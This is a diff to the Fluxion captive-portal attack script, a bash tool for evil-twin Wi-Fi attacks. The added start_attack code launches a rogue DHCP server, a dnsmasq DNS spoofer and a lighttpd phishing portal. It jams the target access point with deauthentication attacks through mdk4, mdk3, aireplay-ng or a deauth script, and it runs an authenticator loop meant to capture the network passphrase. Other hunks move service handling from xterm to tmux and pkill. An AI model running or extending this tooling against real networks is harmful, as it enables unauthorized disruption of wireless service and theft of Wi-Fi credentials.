@@ -135,6 +135,7 @@ function captive_portal_unset_ap_service() {
   fi
 }
 
+
 function captive_portal_set_ap_service() {
   if [ "$CaptivePortalAPService" ]; then
     if ! type -t ap_service_start; then
@@ -195,6 +196,7 @@ read -p $'\e[0;31m[\e[1;34mfluxion\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;3
   # AP Service: Load the service's helper routines.
   source "$FLUXIONLibPath/ap/$CaptivePortalAPService.sh"
 }
+
 
 captive_portal_unset_authenticator() {
   if [ ! "$CaptivePortalAuthenticatorMode" ]; then return 0; fi
@@ -288,13 +290,20 @@ captive_portal_set_authenticator() {
 }
 
 captive_portal_run_certificate_generator() {
-  xterm -bg "#000000" -fg "#CCCCCC" \
-    -title "Generating Self-Signed SSL Certificate" -e openssl req \
+  #xterm -bg "#000000" -fg "#CCCCCC" \
+   # -title "Generating Self-Signed SSL Certificate" -e openssl req \
+    #-subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' \
+    #-new -newkey rsa:2048 -days 365 -nodes -x509 \
+    #-keyout "$FLUXIONWorkspacePath/server.pem" \
+    #-out "$FLUXIONWorkspacePath/server.pem"
+    # Details -> https://www.openssl.org/docs/manmaster/apps/openssl.html
+  #chmod 400 "$FLUXIONWorkspacePath/server.pem"
+  
+  openssl req \
     -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' \
     -new -newkey rsa:2048 -days 365 -nodes -x509 \
     -keyout "$FLUXIONWorkspacePath/server.pem" \
     -out "$FLUXIONWorkspacePath/server.pem"
-    # Details -> https://www.openssl.org/docs/manmaster/apps/openssl.html
   chmod 400 "$FLUXIONWorkspacePath/server.pem"
 }
 
@@ -659,7 +668,8 @@ server.modules = (
     \"mod_accesslog\",
     \"mod_fastcgi\",
     \"mod_redirect\",
-    \"mod_rewrite\"
+    \"mod_rewrite\",
+    \"mod_openssl\"
 )
 
 accesslog.filename = \"$FLUXIONWorkspacePath/lighttpd.log\"
@@ -759,6 +769,9 @@ no-hosts
 
   local -r targetSSIDCleanNormalized=${FluxionTargetSSIDClean//"/\\"}
   # Attack arbiter script
+  if test -f "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" ; then
+	rm  "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" > /dev/null
+  fi	
   echo "\
 #!/usr/bin/env bash
 
@@ -965,7 +978,8 @@ captive_portal_generic() {
 
   base64 -d "$FLUXIONPath/attacks/Captive Portal/generic/assets" >"$FLUXIONWorkspacePath/file.zip"
 
-  unzip "$FLUXIONWorkspacePath/file.zip" -d "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
+  #unzip "$FLUXIONWorkspacePath/file.zip" -d "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
+  unzip -o "$FLUXIONWorkspacePath/file.zip" -d "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
   sandbox_remove_workfile "$FLUXIONWorkspacePath/file.zip"
 
   echo "\
@@ -1346,37 +1360,58 @@ stop_attack() {
   #)
 
   # Signal any authenticator to stop authentication loop.
-  fluxion_kill_lineage "--signal SIGABRT" \
-    "xterm.+captive_portal_authenticator\\.sh"
+  #fluxion_kill_lineage "--signal SIGABRT" \
+   # "xterm.+captive_portal_authenticator\\.sh"
 
-  if [ "$CaptivePortalJammerServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalJammerServiceXtermPID
-    CaptivePortalJammerServiceXtermPID="" # Clear parent PID
+  #if [ "$CaptivePortalJammerServiceXtermPID" ]; then
+   # fluxion_kill_lineage $CaptivePortalJammerServiceXtermPID
+    #CaptivePortalJammerServiceXtermPID="" # Clear parent PID
+  #fi
+  pkill -9 php-cgi
+  
+  if tmux list-windows -F '#W' | grep -q "^deauth\$"; then
+		tmux kill-window -t fluxion:deauth &> $FLUXIONOutputDevice
+		CaptivePortalJammerServiceXtermPID=""
   fi
   sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk4_blacklist.lst"
 
   # Kill captive portal web server log viewer.
-  if [ "$CaptivePortalWebServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalWebServiceXtermPID
-    CaptivePortalWebServiceXtermPID="" # Clear service PID
-  fi
+  #if [ "$CaptivePortalWebServiceXtermPID" ]; then
+   # fluxion_kill_lineage $CaptivePortalWebServiceXtermPID
+    #CaptivePortalWebServiceXtermPID="" # Clear service PID
+  #fi
 
+	if tmux list-windows -F '#W' | grep -q "^lighttpdlog\$"; then
+		tmux kill-window -t fluxion:lighttpdlog &> $FLUXIONOutputDevice
+		CaptivePortalWebServiceXtermPID=""
+    fi
+  
   # Kill captive portal web server.
   if [ "$CaptivePortalWebServicePID" ]; then
-    fluxion_kill_lineage $CaptivePortalWebServicePID
+    
+    pkill -9 lighttpd
     CaptivePortalWebServicePID="" # Clear service PID
   fi
 
   # Kill DNS service if one is found.
-  if [ "$CaptivePortalDNSServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalDNSServiceXtermPID
-    CaptivePortalDNSServiceXtermPID="" # Clear parent PID
+  #if [ "$CaptivePortalDNSServiceXtermPID" ]; then
+   # fluxion_kill_lineage $CaptivePortalDNSServiceXtermPID
+    #CaptivePortalDNSServiceXtermPID="" # Clear parent PID
+  #fi
+  if tmux list-windows -F '#W' | grep -q "^dns\$"; then
+		pkill -9 dnsmasq
+		CaptivePortalDNSServiceXtermPID=""
   fi
-
   # Kill DHCP service.
-  if [ "$CaptivePortalDHCPServiceXtermPID" ]; then
-    fluxion_kill_lineage $CaptivePortalDHCPServiceXtermPID
-    CaptivePortalDHCPServiceXtermPID="" # Clear parent PID
+  #if [ "$CaptivePortalDHCPServiceXtermPID" ]; then
+   # fluxion_kill_lineage $CaptivePortalDHCPServiceXtermPID
+    #CaptivePortalDHCPServiceXtermPID="" # Clear parent PID
+  #fi
+  
+  if tmux list-windows -F '#W' | grep -q "^dhcp\$"; then
+		
+		pkill -9 dhcpd
+		CaptivePortalDHCPServiceXtermPID=""
   fi
   sandbox_remove_workfile "$FLUXIONWorkspacePath/clients.txt"
 
@@ -1466,7 +1501,33 @@ start_attack() {
 
   captive_portal_start_interface
 
+echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk4_blacklist.lst"
+lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" & CaptivePortalWebServicePID=$!
 
+tmux new-window -n dhcp "dhcpd -d -f -lf $FLUXIONWorkspacePath/dhcpd.leases -cf $FLUXIONWorkspacePath/dhcpd.conf $CaptivePortalAccessInterface 2>&1 | tee -a $FLUXIONWorkspacePath/clients.txt"
+
+tmux new-window -n dns "dnsmasq -C $FLUXIONWorkspacePath/dnsmasq.conf"
+
+
+
+
+if [ $FLUXIONEnable5GHZ -eq 1 ]; then
+tmux new-window -n deauth "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" & CaptivePortalJammerServiceXtermPID=$!
+elif [[ $option_deauth -eq 1 ]]; then
+tmux new-window -n deauth "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b $FLUXIONWorkspacePath/mdk4_blacklist.lst" & CaptivePortalJammerServiceXtermPID=$!
+
+elif [[ $option_deauth -eq 2 ]]; then
+tmux new-window -n deauth "aireplay-ng -0 0 -a $FluxionTargetMAC --ignore-negative-one $CaptivePortalJammerInterface" & CaptivePortalJammerServiceXtermPID=$!
+
+elif [[ $option_deauth -eq 3 ]]; then
+tmux new-window -n deauth "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b $FLUXIONWorkspacePath/mdk4_blacklist.lst" & CaptivePortalJammerServiceXtermPID=$!
+fi
+
+tmux new-window -n lighttpdlog "tail -f $FLUXIONWorkspacePath/lighttpd.log"
+tmux new-window -n captiveauth "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+
+
+<<comment
   echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
   xterm $FLUXIONHoldXterm $TOPLEFT -bg black -fg "#CCCC00" \
     -title "FLUXION AP DHCP Service" -e \
@@ -1540,6 +1601,8 @@ start_attack() {
   authService=$!
   echo "Auth Service: $authService" \
     >> $FLUXIONOutputDevice
+comment
+   
 }
 
 # FLUXSCRIPT END
